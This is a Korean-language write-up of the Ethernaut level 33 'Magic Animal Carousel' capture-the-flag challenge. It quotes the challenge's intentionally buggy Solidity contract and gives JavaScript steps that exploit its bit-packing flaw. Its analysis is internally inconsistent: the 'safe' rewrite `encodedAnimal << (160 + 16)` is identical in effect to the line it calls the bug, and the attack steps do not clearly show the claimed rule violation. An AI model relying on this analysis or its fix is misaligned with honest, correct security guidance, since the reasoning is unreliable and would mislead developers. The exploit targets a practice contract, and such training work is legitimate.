# Ethernaut Level 33 - Magic Animal Carousel

## 문제 설명

회전목마에 동물을 추가하면 나중에 같은 동물이 그 자리에 있어야 한다는 규칙이 있다.
이 규칙을 깨는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;  // 65535

    // slot 레이아웃 (256비트)
    // [255:176] animal name  (80 bits)
    // [175:160] next crate id (16 bits)
    // [159:0]   owner address (160 bits)
    uint256 constant ANIMAL_MASK   = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK  = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK    = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    constructor() {
        carousel[0] ^= 1 << 160;  // crate 0의 nextId = 1
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());

        carousel[nextCrateId] =
            (carousel[nextCrateId] & ~NEXT_ID_MASK)
            ^ (encodedAnimal << 160 + 16)      // ← 버그! 연산자 우선순위
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160
            | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

---

## 취약점 분석

### 1. 연산자 우선순위 버그

```solidity
(encodedAnimal << 160 + 16)
```

Solidity에서 `+`는 `<<`보다 **우선순위가 높다**.

따라서 위 코드는:
```
encodedAnimal << (160 + 16)
= encodedAnimal << 176
```

### 2. ANIMAL_MASK 계산 오류

```solidity
uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
// 실제 계산: uint80.max << 176
```

`ANIMAL_MASK`도 동일하게 `<< 176`으로 계산된다.

따라서 `setAnimalAndSpin`에서 animal은 비트 `[255:176]`에 저장되고,
`changeAnimal`에서도 동일한 마스크를 사용하므로 **정상적으로 보이지만**...

### 3. changeAnimal의 다른 인코딩

```solidity
function changeAnimal(string calldata animal, uint256 crateId) external {
    // ...
    uint256 encodedAnimal = encodeAnimalName(animal);  // ← >> 16 없음!
    if (encodedAnimal != 0) {
        carousel[crateId] =
            (encodedAnimal << 160)  // ← << 160만 적용
            | (carousel[crateId] & NEXT_ID_MASK)
            | uint160(msg.sender);
    }
}
```

`setAnimalAndSpin`: `encodeAnimalName(animal) >> 16` → `<< 176` = `<< (176)`
`changeAnimal`:    `encodeAnimalName(animal)`       → `<< 160`

두 함수의 인코딩 위치가 다르다:
- `setAnimalAndSpin`: 비트 `[255:176]`에 저장
- `changeAnimal`:     비트 `[239:160]`에 저장

→ `changeAnimal`로 동물을 변경하면 원래와 다른 위치에 저장되어 규칙 위반!

### 4. 공격 전략

```
1. setAnimalAndSpin("Cat") → crate 1에 "Cat"이 [255:176]에 저장
2. changeAnimal("Dog", 1)  → "Dog"이 [239:160]에 저장
3. carousel[1]을 읽으면 원래 "Cat"과 다른 값
```

---

## 공격 단계

### Step 1 — 동물 추가

```js
await contract.setAnimalAndSpin("Cat")
// crate 1 생성, currentCrateId = 1
```

### Step 2 — 다른 동물로 교체 (changeAnimal)

```js
await contract.changeAnimal("Dog", 1)
// 인코딩 위치가 달라 실제 저장값이 변형됨
```

### Step 3 — 확인

```js
let crateValue = await contract.carousel(1)
// animal 비트를 파싱하면 "Cat"과 다른 값이 나옴 → 규칙 위반
```

---

## 핵심 교훈

```solidity
// ❌ 위험 - 연산자 우선순위 오류
encodedAnimal << 160 + 16   // 실제: encodedAnimal << 176

// ✅ 안전 - 괄호로 명시
encodedAnimal << (160 + 16)

// ❌ 위험 - 함수 간 인코딩 불일치
// setAnimalAndSpin: encodeAnimalName(animal) >> 16  → << 176
// changeAnimal:     encodeAnimalName(animal)         → << 160

// ✅ 안전 - 동일한 인코딩/디코딩 함수 사용
```

- 비트 마스크 연산 시 연산자 우선순위를 반드시 괄호로 명시
- 동일한 데이터를 다루는 함수들 간의 인코딩 일관성 유지
- 비트 패킹 구조는 명확한 상수와 함수로 추상화 권장
